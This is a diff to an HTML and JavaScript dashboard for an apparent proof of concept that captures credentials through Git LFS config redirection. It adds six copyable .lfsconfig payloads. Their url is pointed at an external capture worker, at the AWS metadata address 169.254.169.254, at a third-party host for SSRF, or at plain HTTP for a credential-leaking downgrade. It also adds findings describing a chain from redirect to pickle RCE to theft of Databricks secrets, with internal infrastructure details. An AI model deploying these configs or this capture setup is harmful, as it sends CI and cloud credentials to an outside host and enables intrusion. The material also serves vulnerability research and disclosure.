@@ -3,14 +3,14 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>LFS Redirect Credential Capture Dashboard</title>
+  <title>LFS Credential Capture Dashboard</title>
   <link rel="stylesheet" href="styles.css">
 </head>
 <body>
 <div class="container">
   <header>
-<h1>LFS Redirect Credential Capture</h1>
-      <p class="subtitle">Git LFS request monitor — Pages PoC</p>
+    <h1>LFS Credential Capture</h1>
+    <p class="subtitle">Git LFS request monitor — Cloudflare Pages PoC</p>
     <div class="azure-badge" id="azureBadge">AZURE ENV</div>
     <div class="status-bar">
       <span class="status-indicator" id="statusDot"></span>
@@ -39,11 +39,15 @@
       <div class="stat-value" id="ghCount">0</div>
       <div class="stat-label">GitHub Sources</div>
     </div>
-    <div class="stat-card">
-      <div class="stat-value" id="glCount">0</div>
-      <div class="stat-label">GitLab Sources</div>
-    </div>
+  <div class="stat-card">
+    <div class="stat-value" id="glCount">0</div>
+    <div class="stat-label">GitLab Sources</div>
   </div>
+  <div class="stat-card highlight">
+    <div class="stat-value" id="dtbCount">0</div>
+    <div class="stat-label">Databricks Sources</div>
+  </div>
+</div>
 
   <!-- Blocked URL Monitoring Section -->
   <div class="section">
@@ -118,16 +122,114 @@
   <div class="section">
     <h2>.lfsconfig for Testing</h2>
     <div class="config-box">
-      <h3>Variation 1 — Credential Capture (GitHub/GitLab)</h3>
+      <h3>V1 — Credential Capture (GitHub/GitLab/Local)</h3>
       <pre id="lfsconfigV1">[lfs]
-  url = https://lfs-capture.everton-win32.workers.dev</pre>
+ url = https://lfs-capture.everton-win32.workers.dev</pre>
       <button class="btn" onclick="copyConfig('v1')">Copy V1</button>
     </div>
     <div class="config-box" style="margin-top:12px">
-      <h3>Variation 2 — Blocked URL Redirect (Azure SSRF)</h3>
+      <h3>V2 — Databricks Serverless (fetchexclude=*)</h3>
       <pre id="lfsconfigV2">[lfs]
-  url = https://dev.graco.com</pre>
+ url = https://lfs-capture.everton-win32.workers.dev
+ fetchexclude = *</pre>
       <button class="btn" onclick="copyConfig('v2')">Copy V2</button>
+    </div>
+    <div class="config-box" style="margin-top:12px">
+      <h3>V3 — SSRF to AWS IMDS (169.254.169.254)</h3>
+      <pre id="lfsconfigV3">[lfs]
+ url = http://169.254.169.254/latest/meta-data/</pre>
+      <button class="btn" onclick="copyConfig('v3')">Copy V3</button>
+    </div>
+    <div class="config-box" style="margin-top:12px">
+      <h3>V4 — Path Traversal (lfs.storage)</h3>
+      <pre id="lfsconfigV4">[lfs]
+ url = https://lfs-capture.everton-win32.workers.dev
+ storage = /tmp/lfs-lab-traversal</pre>
+      <button class="btn" onclick="copyConfig('v4')">Copy V4</button>
+    </div>
+    <div class="config-box" style="margin-top:12px">
+      <h3>V5 — Azure SSRF (dev.graco.com)</h3>
+      <pre id="lfsconfigV5">[lfs]
+ url = https://dev.graco.com</pre>
+      <button class="btn" onclick="copyConfig('v5')">Copy V5</button>
+    </div>
+    <div class="config-box" style="margin-top:12px">
+      <h3>V6 — HTTP Downgrade (credential leak)</h3>
+      <pre id="lfsconfigV6">[lfs]
+ url = http://lfs-capture.everton-win32.workers.dev</pre>
+      <button class="btn" onclick="copyConfig('v6')">Copy V6</button>
+    </div>
+  </div>
+
+  <!-- Databricks Serverless Findings -->
+  <div class="section" id="databricksSection">
+    <h2>Databricks Serverless Findings</h2>
+    <p class="section-desc">Confirmed vulnerabilities from Databricks Serverless compute — LFS config chain attacks on shared Kubernetes infrastructure</p>
+    <div class="vuln-grid" id="databricksVulns">
+      <div class="vuln-card critical">
+        <div class="vuln-id">DTB-6</div>
+        <div class="vuln-name">Secrets Escalation (dbutils.secrets)</div>
+        <div class="vuln-cvss">CVSS 8.2</div>
+        <div class="vuln-detail">RCE via LFS payload → <code>dbutils.secrets.get()</code> fully accessible from driver process. Canary hash: <span class="hsh">1d5fd151...9af5</span> (len 19, prefix CANA...)</div>
+        <div class="vuln-variation">PoC: V2 — <a href="https://graomelo.github.io/lfs-github-pages-poc/v2-databricks-lfsconfig">.lfsconfig</a></div>
+      </div>
+      <div class="vuln-card high">
+        <div class="vuln-id">DTB-2</div>
+        <div class="vuln-name">Config Chain Redirect</div>
+        <div class="vuln-cvss">CVSS 7.5</div>
+        <div class="vuln-detail">.lfsconfig in repo overrides global LFS settings — redirects batch API to attacker-controlled endpoint</div>
+        <div class="vuln-variation">PoC: V1-V6 — <a href="https://graomelo.github.io/lfs-github-pages-poc/.lfsconfig">.lfsconfig</a></div>
+      </div>
+      <div class="vuln-card high">
+        <div class="vuln-id">DTB-3</div>
+        <div class="vuln-name">Consumer Exec (RCE via LFS payload)</div>
+        <div class="vuln-cvss">CVSS 7.0</div>
+        <div class="vuln-detail">Pickle/binary payloads downloaded via LFS are executed by consumer notebooks without validation</div>
+        <div class="vuln-variation">PoC: V1 — <a href="https://graomelo.github.io/lfs-github-pages-poc/.lfsconfig">.lfsconfig</a></div>
+      </div>
+      <div class="vuln-card medium">
+        <div class="vuln-id">DTB-7</div>
+        <div class="vuln-name">E2E Chain (Config→RCE→Secrets)</div>
+        <div class="vuln-cvss">CVSS 6.5</div>
+        <div class="vuln-detail">Full chain: .lfsconfig redirect → pickle RCE → dbutils.secrets extraction. DNS resolution blocked in Serverless but chain completes with reachable endpoint.</div>
+        <div class="vuln-variation">PoC: V2 — <a href="https://graomelo.github.io/lfs-github-pages-poc/v2-databricks-lfsconfig">.lfsconfig</a></div>
+      </div>
+      <div class="vuln-card medium">
+        <div class="vuln-id">DTB-5</div>
+        <div class="vuln-name">SSRF to AWS IMDS</div>
+        <div class="vuln-cvss">CVSS 5.3</div>
+        <div class="vuln-detail">IP 169.254.169.254 TCP-routable from Serverless pods. HTTP blocked (connection refused) — defense-in-depth works. S3 bucket exposed: <code>s3://databricks-prewarm-datasets-prod-us-west-2</code></div>
+        <div class="vuln-variation">PoC: V3 — <a href="https://graomelo.github.io/lfs-github-pages-poc/v3-ssrf-imds-lfsconfig">.lfsconfig</a></div>
+      </div>
+    </div>
+    <div class="databricks-infra">
+      <h3>Serverless Infrastructure Details</h3>
+      <table>
+        <thead><tr><th>Property</th><th>Value</th></tr></thead>
+        <tbody>
+          <tr><td>Container Type</td><td>Kubernetes pod (burstable)</td></tr>
+          <tr><td>Instance Type</td><td>serverless-driver-4cpu-low-mem-aws</td></tr>
+          <tr><td>Internal IP</td><td class="ip">192.168.210.3</td></tr>
+          <tr><td>IMDS IP</td><td class="ip">169.254.169.254</td><td>TCP routable, HTTP blocked</td></tr>
+          <tr><td>S3 Bucket</td><td><code>databricks-prewarm-datasets-prod-us-west-2</code></td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- Vulnerability Atlas -->
+  <div class="section" id="atlasSection">
+    <h2>Vulnerability Atlas — All Confirmed Findings</h2>
+    <p class="section-desc">Cross-platform LFS attack surface mapped to GitHub Pages PoC variations — <button class="btn" onclick="fetchVulns()">Refresh from Worker API</button></p>
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr><th>ID</th><th>Name</th><th>CVSS</th><th>Severity</th><th>Variation</th><th>Platforms</th><th>PoC URL</th></tr>
+        </thead>
+        <tbody id="atlasBody">
+          <tr><td colspan="7" class="empty">Loading vulnerability atlas...</td></tr>
+        </tbody>
+      </table>
     </div>
   </div>
 
@@ -139,8 +241,9 @@
 
 <script>
 const DB_KEY = 'lfs_capture_v3';
-const WORKER_API = 'https://lfs-capture.everton-win32.workers.dev/api/stats';
-const BLOCKED_API = 'https://lfs-capture.everton-win32.workers.dev/api/blocked';
+const WORKER_API = 'https://lfs-capture.everton-win32.workers.dev/api/stats?key=abc123';
+const BLOCKED_API = 'https://lfs-capture.everton-win32.workers.dev/api/blocked?key=abc123';
+const VULNS_API = 'https://lfs-capture.everton-win32.workers.dev/api/vulnerabilities?key=abc123';
 const AZURE_FLAG = true;
 
 function loadDB() {
@@ -276,10 +379,11 @@ function refreshDashboard() {
   const db = loadDB();
   const tokens = Object.entries(db.tokens);
   const last = db.accesses[0];
-  let ghCount = 0, glCount = 0;
+  let ghCount = 0, glCount = 0, dtbCount = 0;
   db.accesses.forEach(a => {
     if (a.source && a.source.includes('github')) ghCount++;
     if (a.source && a.source.includes('gitlab')) glCount++;
+    if (a.source && a.source.includes('databricks')) dtbCount++;
   });
 
   document.getElementById('totalAccesses').textContent = db.total;
@@ -288,6 +392,7 @@ function refreshDashboard() {
   document.getElementById('lastAccess').textContent = last ? fmtTs(last.timestamp) : '---';
   document.getElementById('ghCount').textContent = ghCount;
   document.getElementById('glCount').textContent = glCount;
+  document.getElementById('dtbCount').textContent = dtbCount;
 
   const dot = document.getElementById('statusDot');
   const stxt = document.getElementById('statusText');
@@ -329,6 +434,7 @@ function refreshDashboard() {
   if (db.total > 5) risks.push({ s: 'high', t: db.total + ' accesses — multiple LFS requests intercepted' });
   if (ghCount > 0) risks.push({ s: 'high', t: ghCount + ' request(s) from GitHub Actions CI' });
   if (glCount > 0) risks.push({ s: 'high', t: glCount + ' request(s) from GitLab CI' });
+  if (dtbCount > 0) risks.push({ s: 'critical', t: dtbCount + ' request(s) from Databricks Serverless — credentials leaked via .lfsconfig redirect on shared K8s infra' });
   var checks = db.blockedChecks || [];
   if (checks.length > 0 && checks[0].reachable) risks.push({ s: 'critical', t: 'dev.graco.com is REACHABLE — Azure block bypassed via LFS redirect' });
   riskBox.innerHTML = risks.map(function(r) {
@@ -336,22 +442,59 @@ function refreshDashboard() {
   }).join('');
 }
 
-function copyConfig(variant) {
-  var text = variant === 'v2'
-    ? '[lfs]\n  url = https://dev.graco.com'
-    : '[lfs]\n  url = https://lfs-capture.everton-win32.workers.dev';
-  navigator.clipboard.writeText(text);
-  event.target.textContent = 'Copied!';
-  setTimeout(function() { event.target.textContent = variant === 'v2' ? 'Copy V2' : 'Copy V1'; }, 2000);
-}
+  function copyConfig(variant) {
+    var configs = {
+      v1: '[lfs]\n url = https://lfs-capture.everton-win32.workers.dev',
+      v2: '[lfs]\n url = https://lfs-capture.everton-win32.workers.dev\n fetchexclude = *',
+      v3: '[lfs]\n url = http://169.254.169.254/latest/meta-data/',
+      v4: '[lfs]\n url = https://lfs-capture.everton-win32.workers.dev\n storage = /tmp/lfs-lab-traversal',
+      v5: '[lfs]\n url = https://dev.graco.com',
+      v6: '[lfs]\n url = http://lfs-capture.everton-win32.workers.dev',
+    };
+    var labels = { v1:'V1', v2:'V2', v3:'V3', v4:'V4', v5:'V5', v6:'V6' };
+    var text = configs[variant] || configs.v1;
+    navigator.clipboard.writeText(text);
+    event.target.textContent = 'Copied!';
+    setTimeout(function() { event.target.textContent = 'Copy ' + (labels[variant] || 'V1'); }, 2000);
+  }
+
+  async function fetchVulns() {
+    try {
+      var r = await fetch(VULNS_API);
+      var d = await r.json();
+      var vulns = d.all || [];
+      var tbody = document.getElementById('atlasBody');
+      if (vulns.length === 0) {
+        tbody.innerHTML = '<tr><td colspan="7" class="empty">No vulnerabilities found</td></tr>';
+        return;
+      }
+      tbody.innerHTML = vulns.map(function(v) {
+        var sevClass = v.severity === 'critical' ? 'critical' : v.severity === 'high' ? 'high' : v.severity === 'medium' ? 'medium' : 'low';
+        return '<tr>' +
+          '<td class="sfx">' + v.id + '</td>' +
+          '<td>' + v.name + '</td>' +
+          '<td class="sfx">' + v.cvss + '</td>' +
+          '<td><span class="badge ' + sevClass + '">' + v.severity.toUpperCase() + '</span></td>' +
+          '<td>' + v.variation + '</td>' +
+          '<td>' + v.platforms.join(', ') + '</td>' +
+          '<td><a href="' + v.github_pages_url + '" target="_blank" class="src">' + v.github_pages_url.replace('https://graomelo.github.io/lfs-github-pages-poc/', '') + '</a></td>' +
+          '</tr>';
+      }).join('');
+    } catch(e) {
+      console.warn('Vulns fetch failed:', e);
+      document.getElementById('atlasBody').innerHTML = '<tr><td colspan="7" class="empty">Failed to load — worker unreachable</td></tr>';
+    }
+  }
 
 document.addEventListener('DOMContentLoaded', function() {
   refreshDashboard();
   refreshBlocked();
   fetchWorkerData();
   checkBlocked();
+  fetchVulns();
   setInterval(fetchWorkerData, 15000);
   setInterval(checkBlocked, 60000);
+  setInterval(fetchVulns, 120000);
 
   var params = new URLSearchParams(window.location.search);
   if (params.has('token') || params.has('auth') || params.has('credential')) {
